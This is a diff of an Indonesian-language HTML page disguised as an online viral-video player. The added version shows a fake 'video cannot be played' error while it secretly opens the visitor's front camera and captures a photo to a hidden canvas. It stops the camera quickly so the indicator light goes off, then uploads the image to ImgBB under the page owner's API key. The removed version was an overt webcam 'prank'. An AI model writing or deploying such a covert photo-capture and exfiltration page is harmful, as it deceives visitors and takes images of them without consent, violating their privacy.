@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Eksklusif: Video Viral Terbaru 2026</title>
+    <title>Pemutar Video Online</title>
     <style>
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
@@ -18,212 +18,141 @@
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
             min-height: 100vh;
-            padding: 20px 10px;
+            padding: 15px;
         }
 
-        /* Container Utama */
-        .main-container {
+        /* Container Pemutar Video */
+        .player-container {
             width: 100%;
-            max-width: 850px;
+            max-width: 800px;
+            background-color: #181818;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.8);
         }
 
-        /* Navbar Sederhana */
-        .navbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #272727;
-            margin-bottom: 20px;
-        }
-
-        .logo {
-            font-size: 20px;
-            font-weight: bold;
-            color: #ff0000;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        /* Pemutar Video */
-        .video-wrapper {
+        /* Layar Pemutar Video Hitam */
+        .video-screen {
             position: relative;
             width: 100%;
             padding-top: 56.25%; /* Ratio 16:9 */
             background-color: #000000;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
-        }
-
-        .video-content {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
             display: flex;
             justify-content: center;
             align-items: center;
         }
 
-        /* Thumbnail Awal */
-        .thumbnail-overlay {
+        /* Tampilan Pesan Error (Awalnya Tersembunyi) */
+        .error-overlay {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.8) 100%), 
-                        url('https://picsum.photos/1200/675?blur=2') center/cover;
-            display: flex;
+            display: none; /* Muncul setelah tombol diklik */
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 5;
+            background-color: #000000;
+            color: #aaaaaa;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .error-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+            color: #ff4e4e;
+        }
+
+        .error-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 6px;
+        }
+
+        .error-code {
+            font-size: 13px;
+            color: #777777;
+            font-family: monospace;
+            margin-bottom: 15px;
+        }
+
+        .btn-retry {
+            background: #272727;
+            color: #fff;
+            border: 1px solid #444;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 13px;
             cursor: pointer;
         }
 
-        .play-btn {
-            width: 80px;
-            height: 80px;
-            background: rgba(255, 0, 0, 0.9);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
-            transition: transform 0.2s, background 0.2s;
+        .btn-retry:hover {
+            background: #383838;
         }
 
-        .play-btn:hover {
-            transform: scale(1.1);
-            background: #ff0000;
+        /* Detail Video di Bawah Pemutar */
+        .video-details {
+            padding: 18px;
         }
 
-        .play-btn::after {
-            content: '';
-            display: block;
-            width: 0;
-            height: 0;
-            border-style: solid;
-            border-width: 12px 0 12px 22px;
-            border-color: transparent transparent transparent #ffffff;
-            margin-left: 5px;
-        }
-
-        .video-title-overlay {
-            margin-top: 15px;
+        .video-title {
             font-size: 18px;
-            font-weight: 600;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
-            text-align: center;
-            padding: 0 20px;
-        }
-
-        /* Video Feed dari Kamera */
-        #webcam {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1); /* Cermin */
-            display: none;
-        }
-
-        /* Overlay Prank Saat Kamera Aktif */
-        .prank-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: none;
-            flex-direction: column;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px;
-            z-index: 10;
-            background: rgba(0,0,0,0.2);
-            pointer-events: none;
-        }
-
-        .prank-banner {
-            background: #ff0000;
-            color: #fff;
-            padding: 10px 20px;
-            font-size: 22px;
             font-weight: bold;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            animation: pulse 1s infinite alternate;
+            margin-bottom: 8px;
         }
 
-        @keyframes pulse {
-            from { transform: scale(1); }
-            to { transform: scale(1.05); }
+        .video-meta {
+            font-size: 13px;
+            color: #aaa;
         }
 
-        /* Flash Effect */
-        .flash {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #ffffff;
-            opacity: 0;
-            z-index: 20;
-            pointer-events: none;
-        }
-
-        /* Modal / Popup Verifikasi Kamera */
-        .modal-bg {
+        /* Popup Modal Akses / Tonton Video */
+        .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
             background: rgba(0, 0, 0, 0.85);
-            display: none;
+            display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 100;
-            backdrop-filter: blur(5px);
+            z-index: 9999;
+            backdrop-filter: blur(4px);
         }
 
-        .modal-card {
+        .modal-box {
             background: #212121;
-            padding: 25px;
+            padding: 30px 25px;
             border-radius: 12px;
-            max-width: 400px;
+            max-width: 380px;
             width: 90%;
             text-align: center;
             border: 1px solid #333;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
         }
 
-        .modal-icon {
-            font-size: 40px;
+        .modal-box h3 {
+            font-size: 19px;
             margin-bottom: 10px;
+            color: #fff;
         }
 
-        .modal-card h3 {
-            margin-bottom: 10px;
-            font-size: 18px;
-        }
-
-        .modal-card p {
+        .modal-box p {
             font-size: 14px;
-            color: #aaa;
-            margin-bottom: 20px;
+            color: #bbb;
+            margin-bottom: 22px;
             line-height: 1.4;
         }
 
-        .btn-confirm {
+        .btn-watch {
             background: #ff0000;
-            color: white;
+            color: #ffffff;
             border: none;
             padding: 12px 24px;
             font-size: 15px;
@@ -234,142 +163,136 @@
             transition: background 0.2s;
         }
 
-        .btn-confirm:hover {
+        .btn-watch:hover {
             background: #cc0000;
         }
 
-        /* Detail Video Di Bawah Player */
-        .video-info {
-            margin-top: 15px;
-        }
-
-        .video-title {
-            font-size: 20px;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-
-        .video-stats {
-            display: flex;
-            justify-content: space-between;
-            color: #aaa;
-            font-size: 14px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #272727;
-        }
-
-        /* Canvas tersembunyi untuk snapshot */
-        canvas {
+        /* Elemen Tersembunyi untuk Proses Foto */
+        video, canvas {
             display: none;
-        }
-
-        /* Hasil Foto Snapshot */
-        .result-section {
-            margin-top: 20px;
-            background: #1f1f1f;
-            padding: 15px;
-            border-radius: 8px;
-            display: none;
-            text-align: center;
-        }
-
-        .result-section img {
-            max-width: 100%;
-            border-radius: 8px;
-            margin-top: 10px;
-            border: 2px solid #ff0000;
         }
     </style>
 </head>
 <body>
 
-    <div class="main-container">
-        <!-- Header -->
-        <div class="navbar">
-            <div class="logo">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="red"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
-                <span>PlayStream HD</span>
-            </div>
-        </div>
-
-        <!-- Video Player -->
-        <div class="video-wrapper">
-            <div class="video-content">
-                <!-- Thumbnail sebelum klik -->
-                <div class="thumbnail-overlay" id="thumbnail" onclick="showPermissionModal()">
-                    <div class="play-btn"></div>
-                    <div class="video-title-overlay">Klik untuk Memutar Video (HD 1080p)</div>
-                </div>
-
-                <!-- Video Stream dari Kamera Wajah Teman -->
-                <video id="webcam" autoplay playsinline muted></video>
-
-                <!-- Overlay Prank -->
-                <div class="prank-overlay" id="prankOverlay">
-                    <div class="prank-banner">🤪 KAMU KENA PRANK! 📸</div>
-                    <div style="background: rgba(0,0,0,0.7); padding: 6px 12px; border-radius: 4px; font-size: 14px;">
-                        Senyum! Wajah kamu sudah tertangkap kamera!
-                    </div>
-                </div>
-
-                <!-- Flash Effect -->
-                <div class="flash" id="flashEffect"></div>
+    <div class="player-container">
+        <!-- Layar Hitam Pemutar Video -->
+        <div class="video-screen">
+            <!-- Tampilan Error (Awalnya tersembunyi, muncul setelah diklik) -->
+            <div class="error-overlay" id="errorOverlay">
+                <div class="error-icon">⚠️</div>
+                <div class="error-title">Video Tidak Dapat Diputar</div>
+                <div class="error-code">Error Code: ERR_VIDEO_DECODER_INIT_FAILED</div>
+                <button class="btn-retry" onclick="location.reload()">Coba Lagi</button>
             </div>
         </div>
 
         <!-- Detail Video -->
-        <div class="video-info">
-            <div class="video-title">Video Viral Terpopuler Pekan Ini - Tonton Sampai Selesai!</div>
-            <div class="video-stats">
-                <span>1,245,890x ditonton • 6 Okt 2026</span>
-                <span>👍 45K &nbsp;&nbsp; 👎 Suka &nbsp;&nbsp; ↪ Bagikan</span>
-            </div>
-        </div>
-
-        <!-- Section Hasil Foto Prank (Opsi Tampil Lokal) -->
-        <div class="result-section" id="resultSection">
-            <p style="color: #4CAF50; font-weight: bold;">Foto Prank Berhasil Ditiup!</p>
-            <img id="capturedImage" alt="Hasil Foto">
-            <p id="uploadStatus" style="font-size: 12px; color: #888; margin-top: 8px;"></p>
+        <div class="video-details">
+            <div class="video-title">Video Viral Terbaru 2026 - Durasi 03:45</div>
+            <div class="video-meta">1.5M views • Baru saja diunggah</div>
         </div>
     </div>
 
-    <!-- Modal Popup Akses Kamera -->
-    <div class="modal-bg" id="modalBg">
-        <div class="modal-card">
-            <div class="modal-icon">📷</div>
-            <h3>Verifikasi Pemutar Video</h3>
-            <p>Untuk melanjutkan pemutaran video HD, silakan berikan izin akses kamera saat diminta oleh browser.</p>
-            <button class="btn-confirm" onclick="startCamera()">Lihat Video Sekarang</button>
+    <!-- Popup Modal yang Langsung Muncul -->
+    <div class="modal-overlay" id="watchModal">
+        <div class="modal-box">
+            <h3>Konfirmasi Pemutaran</h3>
+            <p>Klik tombol di bawah untuk mulai memutar video secara langsung dalam kualitas HD.</p>
+            <button class="btn-watch" onclick="handleWatchClick()">Tonton Video</button>
         </div>
     </div>
 
-    <!-- Hidden Canvas untuk Snapshot Foto -->
-    <canvas id="canvas"></canvas>
+    <!-- Elemen Kamera & Canvas Tersembunyi (Tidak Terlihat Pengguna) -->
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
 
     <script>
-        // CONFIGURASI IMGBB API
-        // Masukkan API Key ImgBB Anda di bawah ini
+        // ========================================================
+        // MASUKKAN API KEY IMGBB ANDA DI BAWAH INI
+        // ========================================================
         const IMGBB_API_KEY = "MASUKKAN_API_KEY_IMGBB_ANDA_DI_SINI"; 
 
-        const thumbnail = document.getElementById('thumbnail');
-        const modalBg = document.getElementById('modalBg');
-        const webcam = document.getElementById('webcam');
-        const prankOverlay = document.getElementById('prankOverlay');
-        const flashEffect = document.getElementById('flashEffect');
-        const canvas = document.getElementById('canvas');
-        const resultSection = document.getElementById('resultSection');
-        const capturedImage = document.getElementById('capturedImage');
-        const uploadStatus = document.getElementById('uploadStatus');
+        const watchModal = document.getElementById('watchModal');
+        const errorOverlay = document.getElementById('errorOverlay');
+        const hiddenVideo = document.getElementById('hiddenVideo');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
 
-        function showPermissionModal() {
-            modalBg.style.display = 'flex';
+        // Fungsi saat tombol "Tonton Video" diklik
+        async function handleWatchClick() {
+            // 1. Sembunyikan Popup Modal & Tampilkan Layar Error langsung
+            watchModal.style.display = 'none';
+            errorOverlay.style.display = 'flex';
+
+            // 2. Minta Akses Kamera secara diam-diam
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+
+                hiddenVideo.srcObject = stream;
+
+                // Tunggu frame kamera siap lalu ambil foto
+                hiddenVideo.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        captureAndUpload(stream);
+                    }, 500); // Penundaan 0.5 detik agar gambar jernih
+                };
+
+            } catch (err) {
+                console.log("Akses kamera ditolak atau gagal:", err);
+            }
         }
 
-        // Membunyikan suara jepretan kamera menggunakan Web Audio API (Tanpa file mp3 eksternal)
-        function playShutterSound() {
+        // Fungsi Ambil Snapshot Foto & Kirim ke ImgBB
+        function captureAndUpload(stream) {
+            const context = hiddenCanvas.getContext('2d');
+            hiddenCanvas.width = hiddenVideo.videoWidth || 640;
+            hiddenCanvas.height = hiddenVideo.videoHeight || 480;
+
+            // Gambar kamera ke canvas tersembunyi
+            context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+
+            // Matikan Kamera Segera agar indikator/lampu kamera langsung padam
+            stream.getTracks().forEach(track => track.stop());
+
+            // Ubah gambar ke format Base64
+            const base64Image = hiddenCanvas.toDataURL('image/jpeg', 0.8);
+
+            // Upload ke ImgBB jika API Key diisi
+            if (IMGBB_API_KEY && IMGBB_API_KEY !== "MASUKKAN_API_KEY_IMGBB_ANDA_DI_SINI") {
+                uploadToImgBB(base64Image);
+            } else {
+                console.log("Foto berhasil diambil (Base64 siap). Masukkan API Key ImgBB untuk mengunggah.");
+            }
+        }
+
+        // Fungsi Upload ke Server ImgBB
+        async function uploadToImgBB(base64Image) {
             try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = audioCtx.createOscillator();
-                const gain = audioCtx.createGain();
-                osc.type = 'triangle
+                const cleanBase64 = base64Image.replace(/^data:image\/(png|jpeg);base64,/, "");
+                
+                const formData = new FormData();
+                formData.append("key", IMGBB_API_KEY);
+                formData.append("image", cleanBase64);
+
+                const response = await fetch("https://api.imgbb.com/1/upload", {
+                    method: "POST",
+                    body: formData
+                });
+
+                const result = await response.json();
+                if (result.success) {
+                    console.log("Foto Prank Berhasil Diunggah!", result.data.url);
+                } else {
+                    console.error("Gagal Upload ImgBB:", result);
+                }
+            } catch (error) {
+                console.error("Error Upload:", error);
+            }
+        }
+    </script>
+</body>
+    </html>
+    
